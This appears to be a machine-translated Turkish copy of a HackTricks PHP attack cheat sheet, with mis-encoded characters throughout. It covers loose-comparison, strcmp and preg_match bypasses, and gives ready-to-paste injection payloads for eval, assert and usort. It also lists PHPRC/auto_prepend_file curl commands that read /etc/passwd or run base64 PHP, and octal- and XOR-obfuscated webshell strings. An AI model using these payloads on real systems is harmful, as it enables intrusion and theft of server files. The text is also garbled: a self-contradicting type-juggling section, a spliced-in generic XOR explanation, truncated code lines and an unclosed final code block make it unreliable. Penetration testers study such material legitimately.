# PHP Hileleri

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanlÄ±k seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Ã‡erezlerin yaygÄ±n konumu:

Bu, phpMyAdmin Ã§erezleri iÃ§in de geÃ§erlidir.

Ã‡erezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP KarÅŸÄ±laÅŸtÄ±rmalarÄ±nÄ± Atlatma

### GevÅŸek karÅŸÄ±laÅŸtÄ±rmalar/Tip DÃ¶nÃ¼ÅŸÃ¼mÃ¼ ( == )

EÄŸer PHP'de `==` kullanÄ±lÄ±yorsa, beklenmeyen durumlar olabilir ve karÅŸÄ±laÅŸtÄ±rma beklenildiÄŸi gibi davranmayabilir. Bunun sebebi "==" sadece aynÄ± tipe dÃ¶nÃ¼ÅŸtÃ¼rÃ¼len deÄŸerleri karÅŸÄ±laÅŸtÄ±rÄ±r, eÄŸer karÅŸÄ±laÅŸtÄ±rÄ±lan verinin tipinin de aynÄ± olmasÄ±nÄ± istiyorsanÄ±z `===` kullanmanÄ±z gerekmektedir.

PHP karÅŸÄ±laÅŸtÄ±rma tablolarÄ±: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` SayÄ± ile baÅŸlamayan bir string bir sayÄ±ya eÅŸittir
* `"0xAAAA" == "43690" -> True` OndalÄ±k veya onaltÄ±lÄ±k formatlardaki sayÄ±lardan oluÅŸan stringler, aynÄ± sayÄ±ya/diÄŸer stringlere eÅŸit olarak karÅŸÄ±laÅŸtÄ±rÄ±labilir (string iÃ§indeki sayÄ±lar sayÄ± olarak yorumlanÄ±r)
* `"0e3264578" == 0 --> True` "0e" ile baÅŸlayan ve herhangi bir ÅŸeyi takip eden bir string, 0'a eÅŸit olacaktÄ±r
* `"0X3264578" == 0X --> True` "0" ile baÅŸlayan ve herhangi bir harfi takip eden (X herhangi bir harf olabilir) ve herhangi bir ÅŸeyi takip eden bir string, 0'a eÅŸit olacaktÄ±r
* `"0e12334" == "0" --> True` Bu Ã§ok ilginÃ§ Ã§Ã¼nkÃ¼ bazÄ± durumlarda "0" ile baÅŸlayan ve herhangi bir harf iÃ§ermeyen bir string giriÅŸini ve bu string ile karÅŸÄ±laÅŸtÄ±rÄ±lan ve hashlenen iÃ§eriÄŸi kontrol edebilirsiniz. Bu nedenle, "0e" ile baÅŸlayan ve herhangi bir harf iÃ§ermeyen bir hash oluÅŸturacak bir deÄŸer saÄŸlayabilirseniz, karÅŸÄ±laÅŸtÄ±rmayÄ± atlayabilirsiniz. Bu formatta **zaten hashlenmiÅŸ stringleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir stringdeki herhangi bir harf, int 0'a eÅŸittir

Daha fazla bilgi iÃ§in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tip DÃ¶nÃ¼ÅŸÃ¼mÃ¼**, `in_array()` fonksiyonunu da etkiler (katÄ± bir karÅŸÄ±laÅŸtÄ±rma yapmak iÃ§in Ã¼Ã§Ã¼ncÃ¼ argÃ¼manÄ± true olarak ayarlamanÄ±z gerekmektedir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Bu iÅŸlev, **herhangi bir kimlik doÄŸrulama kontrolÃ¼** iÃ§in kullanÄ±lÄ±yorsa (Ã¶rneÄŸin ÅŸifre kontrolÃ¼), ve kullanÄ±cÄ± karÅŸÄ±laÅŸtÄ±rmanÄ±n bir tarafÄ±nÄ± kontrol ediyorsa, ÅŸifre deÄŸeri olarak bir dize yerine boÅŸ bir dizi gÃ¶nderebilir (`https://ornek.com/giris.php/?kullaniciadi=admin&sifre[]=`) ve bu kontrolÃ¼ atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` ile aynÄ± hata meydana gelir.

### SÄ±kÄ± tÃ¼r dÃ¶nÃ¼ÅŸÃ¼mÃ¼

`===` kullanÄ±lsa bile, karÅŸÄ±laÅŸtÄ±rma **tÃ¼r dÃ¶nÃ¼ÅŸÃ¼mÃ¼ne** karÅŸÄ± savunmasÄ±z olabilecek hatalar olabilir. Ã–rneÄŸin, karÅŸÄ±laÅŸtÄ±rma **veriyi karÅŸÄ±laÅŸtÄ±rmadan Ã¶nce farklÄ± bir nesne tÃ¼rÃ¼ne dÃ¶nÃ¼ÅŸtÃ¼rÃ¼yorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanÄ±cÄ± giriÅŸini doÄŸrulamak iÃ§in kullanÄ±labilir (kullanÄ±cÄ± giriÅŸinde siyah liste iÃ§indeki herhangi bir kelime/regex'in bulunup bulunmadÄ±ÄŸÄ±nÄ± kontrol eder ve bulunmazsa, kodun yÃ¼rÃ¼tmesine devam edebilir).

#### Yeni satÄ±r atlatma

Ancak, regexp'in baÅŸlangÄ±cÄ±nÄ± sÄ±nÄ±rlarken `preg_match()` sadece kullanÄ±cÄ± giriÅŸinin ilk satÄ±rÄ±nÄ± kontrol eder, bu nedenle kullanÄ±cÄ± giriÅŸini birkaÃ§ satÄ±r halinde gÃ¶nderebilirseniz, bu kontrolÃ¼ atlayabilirsiniz. Ã–rnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolÃ¼ atlamak iÃ§in deÄŸeri yeni satÄ±rlarla urlencoded (`%0A`) olarak gÃ¶nderebilirsiniz veya JSON verisi gÃ¶nderebiliyorsanÄ±z, bunu birkaÃ§ satÄ±rda gÃ¶nderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Ã–rnek burada bulunabilir: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatasÄ± bypass**

(Bu bypass, PHP 5.2.5'te denenmiÅŸ ve PHP 7.3.15'te Ã§alÄ±ÅŸtÄ±rÄ±lamamÄ±ÅŸtÄ±r)\
EÄŸer `preg_match()` fonksiyonuna geÃ§erli bir **Ã§ok bÃ¼yÃ¼k giriÅŸ** gÃ¶nderebilirseniz, bu giriÅŸ **iÅŸlenemeyecektir** ve kontrolÃ¼ **atlatabileceksiniz**. Ã–rneÄŸin, JSON engelleniyorsa ÅŸunu gÃ¶nderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Bypass

Hile kaynaÄŸÄ±: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

KÄ±sacasÄ±, sorun, PHP'deki `preg_*` fonksiyonlarÄ±nÄ±n [PCRE kÃ¼tÃ¼phanesi](http://www.pcre.org/) Ã¼zerine kurulmasÄ±ndan kaynaklanÄ±r. PCRE'de, bazÄ± dÃ¼zenli ifadeler, Ã§ok sayÄ±da Ã¶zyineli Ã§aÄŸrÄ± kullanarak eÅŸleÅŸtirilir ve bu da Ã§ok fazla yÄ±ÄŸÄ±n alanÄ± kullanÄ±r. Ã–zyineli Ã§aÄŸrÄ±larÄ±n miktarÄ±na bir sÄ±nÄ±rlama getirilebilir, ancak PHP'de bu sÄ±nÄ±rlama [varsayÄ±lan olarak 100.000'dir](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), bu da yÄ±ÄŸÄ±na sÄ±ÄŸmayacak kadar fazladÄ±r.

Bu sorun hakkÄ±nda daha ayrÄ±ntÄ±lÄ± bilgi verilen [bu Stackoverflow konusu](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da gÃ¶nderiye baÄŸlantÄ± olarak verilmiÅŸtir. GÃ¶revimiz ÅŸimdi aÃ§Ä±ktÄ±:\
**`preg_match()` fonksiyonunu `false` dÃ¶ndÃ¼recek ÅŸekilde 100.000'den fazla Ã¶zyinelemeyi gerÃ§ekleÅŸtirecek bir giriÅŸ gÃ¶ndermek, bÃ¶ylece uygulamanÄ±n giriÅŸimizin kÃ¶tÃ¼ niyetli olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmesini saÄŸlamak ve payload'Ä±n sonunda `{system(<Ã§okkÃ¶tÃ¼komut>)}` gibi bir sÃ¼rpriz yaparak SSTI --> RCE --> bayrak :) elde etmek**.

AslÄ±nda, regex terimleriyle, gerÃ§ekte 100k "Ã¶zyineleme" yapmÄ±yoruz, bunun yerine "geri izleme adÄ±mlarÄ±nÄ±" sayÄ±yoruz, ki [PHP belgeleri](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) bunun varsayÄ±lan olarak 1\_000\_000 (1M) olduÄŸunu belirtir `pcre.backtrack_limit` deÄŸiÅŸkeninde.\
Buna ulaÅŸmak iÃ§in, `'X'*500_001` ifadesi 1 milyon geri izleme adÄ±mÄ±na (500k ileri ve 500k geri) yol aÃ§acaktÄ±r:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuskasyonu iÃ§in TÃ¼r tÃ¼rleme

PHP'de tÃ¼r tÃ¼rleme, kodun anlaÅŸÄ±lmasÄ±nÄ± zorlaÅŸtÄ±rmak iÃ§in kullanÄ±lan bir obfuskasyon tekniÄŸidir. TÃ¼r tÃ¼rleme, deÄŸiÅŸkenlerin veya ifadelerin tÃ¼rÃ¼nÃ¼ deÄŸiÅŸtirerek beklenmedik sonuÃ§lar elde etmeyi saÄŸlar.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki kod parÃ§asÄ±nÄ± ele alalÄ±m:

```php
$var1 = "123";
$var2 = 123;

if ($var1 == $var2) {
    echo "EÅŸit";
} else {
    echo "EÅŸit deÄŸil";
}
```

Bu kod parÃ§asÄ±, `$var1` ve `$var2` deÄŸiÅŸkenlerini karÅŸÄ±laÅŸtÄ±rÄ±r ve eÅŸit olup olmadÄ±klarÄ±na baÄŸlÄ± olarak bir mesaj yazdÄ±rÄ±r. Ancak, tÃ¼r tÃ¼rleme kullanarak bu sonucu deÄŸiÅŸtirebiliriz.

```php
$var1 = "123";
$var2 = "abc";

if ($var1 == $var2) {
    echo "EÅŸit";
} else {
    echo "EÅŸit deÄŸil";
}
```

Bu kez, `$var2` deÄŸiÅŸkenini bir dize olarak tanÄ±mladÄ±k. TÃ¼r tÃ¼rleme, `$var1` ve `$var2`'yi karÅŸÄ±laÅŸtÄ±rÄ±rken, dizeyi sayÄ±ya dÃ¶nÃ¼ÅŸtÃ¼rmeye Ã§alÄ±ÅŸÄ±r. Bu nedenle, sonuÃ§ "EÅŸit deÄŸil" olarak yazdÄ±rÄ±lÄ±r.

TÃ¼r tÃ¼rleme, kodun anlaÅŸÄ±lmasÄ±nÄ± zorlaÅŸtÄ±rÄ±r ve hatalarÄ± tespit etmeyi gÃ¼Ã§leÅŸtirir. Bu nedenle, PHP obfuskasyonunda yaygÄ±n olarak kullanÄ±lan bir tekniktir.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## YÃ¶nlendirme SonrasÄ± YÃ¼rÃ¼tme (EAR)

EÄŸer PHP baÅŸka bir sayfaya yÃ¶nlendiriyorsa ancak **`die`** veya **`exit`** fonksiyonu **`Location`** baÅŸlÄ±ÄŸÄ±ndan sonra Ã§aÄŸrÄ±lmÄ±yorsa, PHP yÃ¼rÃ¼tmeye devam eder ve verileri gÃ¶vdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Daha fazla hile

* **register\_globals**: **PHP < 4.1.1.1** sÃ¼rÃ¼mÃ¼nde veya yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, **register\_globals** etkin olabilir (veya davranÄ±ÅŸlarÄ± taklit ediliyor olabilir). Bu, $\_GET gibi global deÄŸiÅŸkenlerde bir deÄŸer varsa Ã¶rneÄŸin $\_GET\["param"]="1234", bu deÄŸere **$param Ã¼zerinden eriÅŸebilirsiniz. Bu nedenle, HTTP parametreleri gÃ¶ndererek kod iÃ§inde kullanÄ±lan deÄŸiÅŸkenleri Ã¼zerine yazabilirsiniz**.
* **AynÄ± alan adÄ±nÄ±n PHPSESSION Ã§erezleri aynÄ± yerde saklanÄ±r**, bu nedenle bir alanda **farklÄ± yollarla farklÄ± Ã§erezler kullanÄ±lÄ±yorsa**, bir yolun diÄŸer yolun Ã§erezine eriÅŸmesini saÄŸlayabilirsiniz.\
Bu ÅŸekilde, **her iki yol da aynÄ± isimde bir deÄŸiÅŸkene eriÅŸirse**, bu deÄŸiÅŸkenin deÄŸerini path1'deki deÄŸiÅŸkene uygulayabilirsiniz. Ve sonra path2, path1'in deÄŸiÅŸkenlerini geÃ§erli olarak kabul edecektir (Ã§ereze path2'de karÅŸÄ±lÄ±k gelen adÄ± vererek).
* Makinenin kullanÄ±cÄ± adlarÄ±nÄ± elde ettiÄŸinizde. PHP dizinlerinin etkin olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in adresi kontrol edin: **/\~\<KULLANICIADÄ°>**.
* [**php sargÄ±larÄ± kullanarak LFI ve RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **ÅŸifrelerden karma oluÅŸturmak** ve bir ÅŸifrenin bir karma ile karÅŸÄ±laÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda doÄŸru olup olmadÄ±ÄŸÄ±nÄ± **kontrol etmek** iÃ§in kullanÄ±lÄ±r.\
Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` (baÅŸlangÄ±cÄ± `$2y$`). **PASSWORD\_DEFAULT** genellikle PASSWORD\_BCRYPT ile aynÄ±dÄ±r. Ve ÅŸu anda, **PASSWORD\_BCRYPT**'in giriÅŸte **72 bayt boyut sÄ±nÄ±rlamasÄ±** vardÄ±r. Bu nedenle, bu algoritma ile 72 bayttan daha bÃ¼yÃ¼k bir ÅŸeyi karma yapmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±zda sadece ilk 72B kullanÄ±lacaktÄ±r:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP baÅŸlÄ±klarÄ±nÄ± PHP hatalarÄ±nÄ± kullanarak atlatma

EÄŸer bir **PHP sayfasÄ± hatalarÄ± yazdÄ±rÄ±yor ve kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan bazÄ± girdileri geri dÃ¶ndÃ¼rÃ¼yorsa**, kullanÄ±cÄ± PHP sunucusunun bazÄ± **yeterince uzun iÃ§erikleri geri dÃ¶ndÃ¼rmesini saÄŸlayabilir**, bÃ¶ylece yanÄ±tÄ±n iÃ§ine baÅŸlÄ±klarÄ± **eklemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda sunucu hata verecektir**.\
AÅŸaÄŸÄ±daki senaryoda **saldÄ±rgan sunucunun bÃ¼yÃ¼k hatalar Ã¼retmesini saÄŸladÄ±**, ve ekran gÃ¶rÃ¼ntÃ¼sÃ¼nde gÃ¶rebileceÄŸiniz gibi php baÅŸlÄ±k bilgilerini **deÄŸiÅŸtirmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda baÅŸaramadÄ±** (bu nedenle Ã¶rneÄŸin CSP baÅŸlÄ±ÄŸÄ± kullanÄ±cÄ±ya gÃ¶nderilmedi):

![](<../../../.gitbook/assets/image (465).png>)

## Kod yÃ¼rÃ¼tme

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla kullanÄ±ÅŸlÄ± PHP fonksiyonu iÃ§in burayÄ± kontrol edin](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argÃ¼manÄ±ndaki kodu Ã§alÄ±ÅŸtÄ±rmak iÃ§in en az bir eÅŸleÅŸme gereklidir. Bu preg\_replace seÃ§eneÄŸi, PHP 5.5.0'den itibaren **kullanÄ±mdan kaldÄ±rÄ±lmÄ±ÅŸtÄ±r.**

### **Eval() ile RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Bu php iÃ§indeki fonksiyon, bir dize iÃ§inde yazÄ±lan kodu **Ã§alÄ±ÅŸtÄ±rmanÄ±za** olanak saÄŸlar ve **true veya false** dÃ¶ndÃ¼rÃ¼r (ve buna baÄŸlÄ± olarak yÃ¼rÃ¼tÃ¼mÃ¼ deÄŸiÅŸtirir). Genellikle kullanÄ±cÄ± deÄŸiÅŸkeni bir dizenin ortasÄ±na yerleÅŸtirilir. Ã–rneÄŸin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek iÃ§in ÅŸunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Kodun sÃ¶zdizimini **kÄ±rmanÄ±z**, ardÄ±ndan **payload** eklemeniz ve sonra tekrar dÃ¼zeltmeniz gerekecek. "**and" veya "%26%26" veya "|"** gibi **mantÄ±ksal iÅŸlemleri** kullanabilirsiniz. Ä°lk koÅŸul doÄŸruysa payloadumuz Ã§alÄ±ÅŸmayacaÄŸÄ± iÃ§in "or" veya "||" Ã§alÄ±ÅŸmaz. AynÄ± ÅŸekilde ";" de Ã§alÄ±ÅŸmaz Ã§Ã¼nkÃ¼ payloadumuz Ã§alÄ±ÅŸtÄ±rÄ±lmaz.

**DiÄŸer bir seÃ§enek**, komutun yÃ¼rÃ¼tÃ¼lmesini dizeye eklemektir: `'.highlight_file('.passwd').'`

**DiÄŸer bir seÃ§enek** (iÃ§ kodunuz varsa), yÃ¼rÃ¼tÃ¼mÃ¼ deÄŸiÅŸtirmek iÃ§in bazÄ± deÄŸiÅŸkenleri deÄŸiÅŸtirmektir: `$file = "hola"`

### **usort() ile RCE**

Bu iÅŸlev, belirli bir iÅŸlevi kullanarak bir Ã¶ÄŸeler dizisini sÄ±ralamak iÃ§in kullanÄ±lÄ±r.\
Bu iÅŸlevi kÃ¶tÃ¼ye kullanmak iÃ§in:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**//** ile kodun geri kalanÄ±nÄ± yorumlayabilirsiniz.

KapatmanÄ±z gereken parantez sayÄ±sÄ±nÄ± keÅŸfetmek iÃ§in:

* `?order=id;}//`: bir hata mesajÄ± alÄ±rÄ±z (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
* `?order=id);}//`: bir **uyarÄ±** alÄ±rÄ±z. Bu doÄŸru gibi gÃ¶rÃ¼nÃ¼yor.
* `?order=id));}//`: bir hata mesajÄ± alÄ±rÄ±z (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanÄ±ÅŸ parantezi var.

### **.httaccess** Ã¼zerinden RCE

EÄŸer bir **.htaccess** dosyasÄ± **yÃ¼kleyebilirseniz**, birÃ§ok ÅŸeyi yapÄ±landÄ±rabilir ve hatta kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz (dosya uzantÄ±sÄ± .htaccess olan dosyalarÄ±n **Ã§alÄ±ÅŸtÄ±rÄ±labilmesini yapÄ±landÄ±rabilirsiniz**).

FarklÄ± .htaccess kabuklarÄ± [burada](https://github.com/wireghoul/htshells) bulunabilir.

### Env DeÄŸiÅŸkenleri Ã¼zerinden RCE

EÄŸer PHP'de **env deÄŸiÅŸkenlerini deÄŸiÅŸtirmenize** izin veren bir zayÄ±flÄ±k bulursanÄ±z (ve baÅŸka bir dosya yÃ¼kleme zayÄ±flÄ±ÄŸÄ± da bulursanÄ±z, daha fazla araÅŸtÄ±rma yaparak bunun atlatÄ±labileceÄŸi olabilir), bu davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanarak **RCE** elde edebilirsiniz.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Bu env deÄŸiÅŸkeni, diÄŸer ikili dosyalarÄ± Ã§alÄ±ÅŸtÄ±rÄ±rken keyfi kÃ¼tÃ¼phaneleri yÃ¼klemenizi saÄŸlar (ancak bu durumda Ã§alÄ±ÅŸmayabilir).
* **`PHPRC`** : PHP'ye **yapÄ±landÄ±rma dosyasÄ±nÄ± nerede bulacaÄŸÄ±nÄ±** sÃ¶yleyen bir env deÄŸiÅŸkenidir, genellikle `php.ini` olarak adlandÄ±rÄ±lÄ±r. Kendi yapÄ±landÄ±rma dosyanÄ±zÄ± yÃ¼kleyebiliyorsanÄ±z, o zaman `PHPRC`'yi kullanarak PHP'yi ona yÃ¶nlendirebilirsiniz. Ä°kinci bir yÃ¼klenen dosyayÄ± belirten bir **`auto_prepend_file`** giriÅŸi ekleyin. Bu ikinci dosya, diÄŸer tÃ¼m kodlardan Ã¶nce PHP Ã§alÄ±ÅŸma zamanÄ± tarafÄ±ndan **Ã§alÄ±ÅŸtÄ±rÄ±lan normal PHP kodunu iÃ§erir**.
1. Shell kodumuzu iÃ§eren bir PHP dosyasÄ± yÃ¼kleyin
2. Ä°kinci bir dosya yÃ¼kleyin, adÄ±mlar 1'de yÃ¼klediÄŸimiz dosyanÄ±n PHP Ã¶n iÅŸleyicisinin yÃ¼klenen dosyayÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlayan bir **`auto_prepend_file`** yÃ¶nergesi iÃ§ersin
3. `PHPRC` deÄŸiÅŸkenini adÄ±mlar 2'de yÃ¼klediÄŸimiz dosyaya ayarlayÄ±n.
* Bu zinciri nasÄ±l Ã§alÄ±ÅŸtÄ±racaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi iÃ§in [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) daha fazla bilgi edinin.
* **PHPRC** - baÅŸka bir seÃ§enek
* EÄŸer **dosya yÃ¼kleyemiyorsanÄ±z**, FreeBSD'de "file" `/dev/fd/0`'Ä± kullanabilirsiniz, bu **`stdin`'i iÃ§eren** "vÃ¼cut" isteÄŸin `stdin`'i olur:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Veya RCE elde etmek iÃ§in **`allow_url_include`**'Ä± etkinleÅŸtirin ve **base64 PHP kodu** ile bir dosyayÄ± Ã¶n ekleyin:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845) alÄ±nmÄ±ÅŸtÄ±r.

## PHP Statik analizi

Bu fonksiyonlara yapÄ±lan Ã§aÄŸrÄ±lara kod ekleyip ekleyemeyeceÄŸinizi kontrol edin ([buradan](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be) alÄ±nmÄ±ÅŸtÄ±r):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
EÄŸer bir PHP uygulamasÄ±nÄ± hata ayÄ±klÄ±yorsanÄ±z, `display_errors = On` satÄ±rÄ±nÄ± ekleyerek `/etc/php5/apache2/php.ini` dosyasÄ±nda hata yazdÄ±rma Ã¶zelliÄŸini etkinleÅŸtirebilir ve apache'yi yeniden baÅŸlatabilirsiniz: `sudo systemctl restart apache2`

### PHP kodunu aÃ§Ä±k hale getirme

PHP kodunu aÃ§Ä±k hale getirmek iÃ§in **web**[ **www.unphp.net**](http://www.unphp.net) **adresini kullanabilirsiniz.**

## PHP SargÄ±layÄ±cÄ±larÄ± ve Protokolleri

PHP SargÄ±layÄ±cÄ±larÄ± ve Protokolleri, bir sistemin yazma ve okuma korumalarÄ±nÄ± **atlamak** ve onu tehlikeye atmak iÃ§in kullanÄ±labilir. [**Daha fazla bilgi iÃ§in bu sayfayÄ± kontrol edin**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug yetkisiz RCE

EÄŸer `phpconfig()` Ã§Ä±ktÄ±sÄ±nda **Xdebug**'in **etkin** olduÄŸunu gÃ¶rÃ¼yorsanÄ±z, [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) adresinden RCE elde etmeyi denemelisiniz.

## DeÄŸiÅŸken deÄŸiÅŸkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Yeni $\_GET\["a"]\($\_GET\["b"]) kullanarak RCE istismarÄ±

Bir sayfada **keyfi bir sÄ±nÄ±fÄ±n yeni bir nesnesi oluÅŸturabiliyorsanÄ±z**, RCE elde etme olasÄ±lÄ±ÄŸÄ±nÄ±z olabilir, nasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sayfaya bakÄ±n:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Harfler olmadan PHP Ã§alÄ±ÅŸtÄ±rma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizli kullanÄ±m
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) is a logical operation that is commonly used in cryptography and computer science. It takes two binary inputs and produces an output that is true only when the inputs differ. In other words, if one input is true and the other is false, the output will be true. However, if both inputs are true or both inputs are false, the output will be false.

In the context of cryptography, XOR is often used to encrypt and decrypt data. When XOR is applied to a plaintext message and a secret key, it produces a ciphertext. To decrypt the ciphertext, XOR is applied again using the same secret key, which results in the original plaintext.

XOR can also be used in programming to perform various operations. For example, it can be used to toggle a bit, swap values, or perform bitwise operations.

In summary, XOR is a versatile operation that has various applications in cryptography, computer science, and programming.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
